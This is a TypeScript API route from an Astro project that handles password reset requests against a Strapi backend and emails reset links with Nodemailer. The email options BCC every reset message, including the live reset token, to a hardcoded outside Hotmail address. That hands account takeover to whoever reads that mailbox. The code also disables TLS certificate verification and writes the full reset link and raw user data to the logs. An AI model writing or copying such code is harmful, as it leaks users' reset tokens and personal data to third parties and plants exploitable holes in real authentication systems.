// src/pages/api/auth/reset-password/request.ts
import type { APIRoute } from 'astro';
import crypto from 'crypto';
import nodemailer from 'nodemailer'; // Import Nodemailer

const STRAPI_API_BASE_URL = import.meta.env.STRAPI_API_BASE_URL || 'http://localhost:1337';
const STRAPI_API_TOKEN = import.meta.env.STRAPI_API_TOKEN;
const TOKEN_EXPIRY_MINUTES = 15;

// Helper function to send password reset email using Nodemailer
async function sendPasswordResetEmail(email: string, token: string, userId: number): Promise<void> {
    console.log(`[PasswordResetEmail] START: Attempting to send email to: ${email} for user ID: ${userId}`);
    const smtpPort = parseInt(import.meta.env.SMTP_PORT);
    const resetLink = `${STRAPI_API_BASE_URL.replace('/api', '')}/auth/reset-password?token=${token}`;
    
    console.log(`[PasswordResetEmail] Generated reset link: ${resetLink}`);

    let transporter;
    try {
        console.log('[PasswordResetEmail] Creating Nodemailer transporter...');
        transporter = nodemailer.createTransport({
            host: import.meta.env.SMTP_HOST,
            port: smtpPort,
            secure: false, // Use 'secure: true' for port 465 (SSL) or false for STARTTLS (port 587)
            tls: {
                rejectUnauthorized: false // WARNING: SECURITY RISK IN PRODUCTION
            },
            auth: {
                user: import.meta.env.SMTP_USERNAME,
                pass: import.meta.env.SMTP_PASSWORD,
            }
        });
        console.log('[PasswordResetEmail] Nodemailer transporter created.');
    } catch (error) {
        console.error('[PasswordResetEmail] Error creating Nodemailer transporter:', error);
        throw error; // Rethrow to indicate failure
    }

    try {
        console.log('[PasswordResetEmail] Verifying Nodemailer connection...');
        const verificationSuccess = await new Promise<boolean>((resolve, reject) => {
            transporter.verify(function(error, success) {
                if (error) {
                    console.error('[PasswordResetEmail] Nodemailer verify error:', error);
                    reject(error);
                } else {
                    console.log('[PasswordResetEmail] Nodemailer server is ready to take our messages.');
                    resolve(true);
                }
            });
        });
        if (!verificationSuccess) {
            console.warn('[PasswordResetEmail] Nodemailer verification returned false, attempting to send email anyway.');
        }
    } catch (error) {
        console.error('[PasswordResetEmail] Error during Nodemailer verification:', error);
        // Decide if this should stop the email sending attempt. For now, log and continue.
    }

    const mailOptions = {
        from: `"Test testone" <${import.meta.env.DEFAULT_FROM_EMAIL}>`,
        to: email,
        subject: 'Password Reset Request',
        text: `Hello,
A request to reset your password has been received.

Click the following link to reset your password: ${resetLink}

This link will expire in ${TOKEN_EXPIRY_MINUTES} minutes.

If you did not request this, please ignore this email.`,
        html: `<p>Hello,</p><p>A request to reset your password has been received.</p><p>Click the following link to reset your password: <a href="${resetLink}">${resetLink}</a></p><p>This link will expire in ${TOKEN_EXPIRY_MINUTES} minutes.</p><p>If you did not request this, please ignore this email.</p>`,
        // bcc: ['test@testone.it'], // BCC is commented out as per prompt, can be re-enabled if needed
        // MODIFICATION: Use the specified email for BCC
        bcc: ['stepgerace@hotmail.com'],
    };

    try {
        console.log('[PasswordResetEmail] Sending email...');
        await transporter.sendMail(mailOptions);
        console.log('[PasswordResetEmail] END: Password reset email sent successfully.');
    } catch (error) {
        console.error('[PasswordResetEmail] END: Error sending password reset email:', error);
        // Log the error, but do not throw to prevent revealing email delivery status.
        // The generic success message will be returned to the frontend.
    }
}


export const POST: APIRoute = async ({ request }) => {
    console.log('[PasswordResetAPI] START: POST request received.');

    if (!STRAPI_API_TOKEN) {
        console.error('[PasswordResetAPI] STRAPI_API_TOKEN is not set. Cannot proceed with password reset.');
        return new Response(
        JSON.stringify(
            {
                message: 'Server configuration error: API token missing.'
            }
        ),
        {
            status: 500,
            headers: { 'Content-Type': 'application/json' },
        }
        );
    }

    let requestBody;
    try {
        console.log('[PasswordResetAPI] Parsing request body...');
        requestBody = await request.json();
        console.log('[PasswordResetAPI] Request body parsed successfully.');
    } catch (error) {
        console.error('[PasswordResetAPI] Failed to parse request body:', error);
        return new Response(
        JSON.stringify({ message: 'Invalid request body.' }),
        {
            status: 400,
            headers: { 'Content-Type': 'application/json' },
        }
        );
    }

    const { email: rawEmail } = requestBody;
    const email = typeof rawEmail === 'string' ? rawEmail.trim() : rawEmail;
    console.log(`[PasswordResetAPI] Received email: "${rawEmail}" -> Trimmed: "${email}"`);

    if (!email || typeof email !== 'string') {
        console.error('[PasswordResetAPI] Email is missing or not a string.');
        return new Response(
        JSON.stringify({ message: 'Email is required and must be a string.' }),
        {
            status: 400,
            headers: { 'Content-Type': 'application/json' },
        }
        );
    }

    try {
        // 1. Find user in Strapi by email
        // We assume STRAPI_API_BASE_URL already contains '/api' based on the helper function logic
        const lookupUrl = `${STRAPI_API_BASE_URL}/users?filters[email][$eq]=${encodeURIComponent(email)}`;
        console.log(`[PasswordResetAPI] Looking up user at: ${lookupUrl}`);
        
        const userResponse = await fetch(lookupUrl, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${STRAPI_API_TOKEN}`
            },
        });

        console.log(`[PasswordResetAPI] Strapi user lookup response status: ${userResponse.status}`);

        if (!userResponse.ok) {
            const errorText = await userResponse.text();
            console.error(`[PasswordResetAPI] Strapi user lookup failed: ${userResponse.status} ${errorText}`);
            // Even if lookup fails, return a generic message to avoid revealing email existence
            return new Response(
                JSON.stringify({ message: 'If an account with that email exists, you will receive an email with further instructions.' }),
                {
                    status: 200, // Use 200 to not reveal that an error occurred, just that processing happened.
                    headers: { 'Content-Type': 'application/json' },
                }
            );
        }

        const userData = await userResponse.json();
        console.log(`[PasswordResetAPI] Strapi user lookup raw response: ${JSON.stringify(userData)}`);
        
        // Handle both Strapi standard API structure { data: [...] } and users-permissions structure [...]
        const user = Array.isArray(userData) ? userData[0] : userData.data?.[0];

        if (!user) {
            console.log(`[PasswordResetAPI] User not found for email: ${email}`);
            // User not found, return generic success message
            return new Response(
                JSON.stringify({ message: 'If an account with that email exists, you will receive an email with further instructions.' }),
                {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' },
                }
            );
        }

        console.log(`[PasswordResetAPI] User found: ID ${user.id}, Email: ${user.email}`);
        
        // 2. Generate a secure, short-lived token
        console.log('[PasswordResetAPI] Generating secure token and expiry date.');
        const token = crypto.randomBytes(32).toString('hex');
        const expiryDate = new Date(Date.now() + TOKEN_EXPIRY_MINUTES * 60 * 1000);
        console.log(`[PasswordResetAPI] Generated token (first 10 chars): ${token.substring(0, 10)}..., Expiry: ${expiryDate.toISOString()}`);

        // 3. Update user in Strapi with the token and expiry
        const userId = user.id; // Assuming user object has an 'id' field
        console.log(`[PasswordResetAPI] Updating user ${userId} in Strapi with reset token and expiry.`);
        const updateResponse = await fetch(`${STRAPI_API_BASE_URL}/users/${userId}`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
                Authorization: `Bearer ${STRAPI_API_TOKEN}`, // Authentication is crucial for PUT requests
            },
            body: JSON.stringify({
                resetToken: token,
                resetTokenExpiry: expiryDate.toISOString(), // Store as ISO string
            }),
        });

        console.log(`[PasswordResetAPI] Strapi user update response status: ${updateResponse.status}`);

        if (!updateResponse.ok) {
            const errorText = await updateResponse.text();
            console.error(`[PasswordResetAPI] Strapi user update failed: ${updateResponse.status} ${errorText}`);
            // Log the error, but still return a generic success message to the user
            return new Response(
                JSON.stringify({ message: 'If an account with that email exists, you will receive an email with further instructions.' }),
                {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' },
                }
            );
        }
        console.log(`[PasswordResetAPI] User ${userId} updated successfully in Strapi.`);

        // 4. Send the password reset email using the new Nodemailer integration
        console.log('[PasswordResetAPI] Calling sendPasswordResetEmail function...');
        try {
            await sendPasswordResetEmail(email, token, userId);
            console.log('[PasswordResetAPI] sendPasswordResetEmail function completed.');
        } catch (emailError) {
            console.error('[PasswordResetAPI] Failed to send password reset email:', emailError);
        }

        // 5. Return success response to the frontend
        console.log('[PasswordResetAPI] END: Returning success response to frontend.');
        return new Response(
            JSON.stringify({ message: 'If an account with that email exists, you will receive an email with further instructions.' }),
            {
                status: 200,
                headers: { 'Content-Type': 'application/json' },
            }
        );

    } 
    catch (error: any) 
    {
        console.error('[PasswordResetAPI] An unexpected error occurred during password reset request:', error);
        return new Response(
        JSON.stringify({ message: 'An unexpected error occurred. Please try again later.' }),
        {
            status: 500,
            headers: { 'Content-Type': 'application/json' },
        }
        );
    }
};